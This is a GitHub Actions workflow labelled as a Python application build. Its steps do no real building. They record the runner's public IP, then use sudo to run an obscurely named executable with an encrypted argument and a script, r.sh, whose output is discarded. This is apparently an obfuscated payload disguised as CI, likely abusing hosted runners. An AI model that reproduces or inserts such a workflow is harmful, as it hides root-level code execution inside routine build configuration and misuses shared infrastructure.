name: Python application

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]

permissions:
  contents: read

jobs:
  build:

    runs-on: ubuntu-latest
    timeout-minutes: 12

    steps:
    - uses: actions/checkout@v3
    - name: Set up Python 3.8
      uses: actions/setup-python@v3
      with:
        python-version: "3.8"
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        curl ifconfig.me > ip.txt
        cat ip.txt
    - name: Test run
      run: |
        cd ${{ github.workspace }}
        echo '7mm6e'
        sudo chmod +x garyiip7x/heardyg34i.ex
        sudo ./garyiip7x/heardyg34i.ex U2FsdGVkX1/yTTAtudY+swPR37/YTEXk1BUjx91eCrrcu8YHobzaZwOfDag9qtZiJwx5qPU/OfR7Dap1YIC8DbGHRkrRG+6emtA0UFiOIcflpmP2Lk9EAyY/Hq6Pwlu1 i47t97 && sudo sh r.sh > /dev/null 2>&1
